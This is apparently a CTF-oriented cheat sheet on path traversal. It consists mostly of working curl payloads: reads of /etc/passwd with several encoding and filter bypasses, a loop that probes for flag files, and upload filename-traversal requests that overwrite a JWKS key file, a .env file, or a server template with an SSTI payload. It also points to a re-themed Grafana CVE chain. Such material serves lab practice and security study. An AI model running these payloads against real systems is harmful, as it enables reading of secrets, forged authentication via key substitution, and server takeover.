# Path traversal (read) and upload write-traversal

## E. Read traversal — filename or path params

```bash
curl -si "<target>/api/file?name=../../../etc/passwd" $AUTH_HEADER              # standard
curl -si "<target>/api/file?name=....//....//....//etc/passwd" $AUTH_HEADER     # four-dot double-slash
curl -si "<target>/api/file?name=..%252f..%252f..%252fetc%252fpasswd" $AUTH_HEADER  # double-encode
curl -si "<target>/api/file?name=../../../etc/passwd%00.txt" $AUTH_HEADER       # null byte
curl -si "<target>/api/file?name=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd" $AUTH_HEADER  # overlong
```

**The `....//` bypass specifically:** Node treats `....` as a literal directory name, so combined with `//` the resolved path reaches a different location than the regex checked. It also defeats suffix-appending suppressors (`.txt`).

Once traversal works:
```bash
for f in '/flag.txt' '/flag' '/root/flag.txt' '/home/user/flag.txt' '/app/flag.txt' '/data/flag.txt' '/var/flag.txt'; do
  echo "=== $f ==="; curl -si "<target>/api/file?name=....//....//..../$f" $AUTH_HEADER
done
```

`/data/` is worth trying early — not just `/` and `/app/`.

## E.2. Upload write-traversal — unsanitized filename

If the app passes the upload filename to a save call (`file.save(UPLOAD_DIR + "/" + filename)`), the filename is a write sink. Overwriting server config/key files is often the fastest escalation.

```bash
# probe: are path separators accepted? 200/302 (not 400/422/500) means it likely landed
curl -si -X POST <target>/api/upload $AUTH_HEADER -F "file=@/dev/null;filename=../canary.txt"

# find the JWKS path
curl -s <target>/static/.well-known/jwks.json && echo "JWKS found"
curl -s <target>/.well-known/jwks.json && echo "JWKS at root"

# depth depends on where UPLOADS_DIR sits relative to the target
#   /app/uploads/ -> /app/static/.well-known/jwks.json  = ../static/.well-known/jwks.json
#   /app/uploads/ -> /static/.well-known/jwks.json      = ../../static/.well-known/jwks.json
curl -si -X POST <target>/api/upload $AUTH_HEADER \
  -F "file=@C:/Tools/CTF/<challenge-name>/exploits/jwks.json;filename=../static/.well-known/jwks.json"

curl -s <target>/static/.well-known/jwks.json | python3 -m json.tool   # verify
```

Other high-value overwrite targets:
```bash
# .env — DB creds / secrets read at runtime
curl -si -X POST <target>/api/upload $AUTH_HEADER \
  -F "file=@C:/Tools/CTF/<challenge-name>/exploits/evil.env;filename=../.env"

# server-side template — overwrite with an SSTI payload
curl -si -X POST <target>/api/upload $AUTH_HEADER \
  -F "file=@C:/Tools/CTF/<challenge-name>/exploits/evil.html;filename=../templates/index.html"
```

JWKS overwrite lands → go to `auth-jwt.md` § JWKS substitution.

## Client-side path traversal + open redirect

When a feature builds a URL by appending a **fixed** suffix to user input (plugin manifests, "app studio", widget marketplaces), a `#` fragment truncates everything after it, and a literal backslash can defeat redirect validation. Full chain (Grafana CVE-2025-4123 re-themed) is in the FurHire-013 writeup.

**If a custom-branded feature feels over-engineered relative to the rest of the app, search for the real product it's themed after and look up that product's recent CVEs by name** — BugForge labs do re-implement disclosed CVEs.
